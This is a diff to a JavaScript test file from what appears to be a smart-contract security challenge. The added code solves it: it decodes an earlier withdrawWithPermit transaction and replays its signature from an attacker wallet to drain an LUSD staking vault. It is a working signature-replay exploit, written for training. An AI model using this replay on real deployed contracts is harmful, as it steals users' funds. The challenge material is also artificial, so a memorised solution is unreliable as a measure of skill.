@@ -74,6 +74,22 @@ describe(NAME, function () {
         it("conduct your attack here", async function () {
             // conduct your attack here
             // the task is to drain daiDeployer's lusdStakingVault balance.
+            const iface = new ethers.utils.Interface([
+                "function withdrawWithPermit(address from, address to, uint256 amount, uint8 v, bytes32 r, bytes32 s)",
+            ]);
+            const latestBlock = await ethers.provider.getBlockNumber();
+            let targetTx;
+            // 6 transactions accured since withdrawWithPermit so we go back 6 blocks
+            // in a realistic scenario we would simply use an indexer API like etherscan to retrieve this data
+            const block = await ethers.provider.getBlockWithTransactions(latestBlock - 6);
+            tx = block.transactions[0];
+            const decoded = iface.decodeFunctionData("withdrawWithPermit", tx.data);
+            targetTx = decoded;
+
+            // Reuse the same signature and call on the vulnerable LUSD vault
+            await lusdStakingVault
+                .connect(attackerWallet)
+                .withdrawWithPermit(targetTx.from, targetTx.to, targetTx.amount, targetTx.v, targetTx.r, targetTx.s);
         });
 
         after(async function () {
